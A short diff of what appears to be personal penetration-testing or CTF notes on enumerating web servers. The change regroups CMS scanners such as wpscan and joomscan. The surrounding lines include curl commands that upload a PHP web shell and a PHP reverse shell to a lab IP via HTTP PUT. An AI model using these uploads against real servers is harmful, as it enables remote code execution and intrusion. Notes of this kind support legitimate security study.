@@ -21,8 +21,10 @@
 1. also use `curl -i -X OPTIONS http://ip/path` to check what METHODs are available on specific resource
     - `curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' http://192.168.142.131/test/shell.php`
     - `curl --upload-file  php-reverse-shell.txt -v --url http://192.168.142.131/test/shell.php -0 --http1.0`
-1. wpscan to find wordpress problems
 1. cms scan (? todo: read it from a tool)
+    - `wpscan` (wordpress)
+    - `joomscan` (joombla)
+    - `drupalscan`(?)
 1. if there is a proxy server run on the target, try to set browser's proxy pointing to the proxy server
     - use `auxiliary/scanner/http/squid_pivot_scanning` metasploit module for squid/proxy scan, ref: [SickOS 1.1](https://highon.coffee/blog/sickos-1-walkthrough/).
 1. it's possible that the server only allow certain user-agent to connect. Check it.
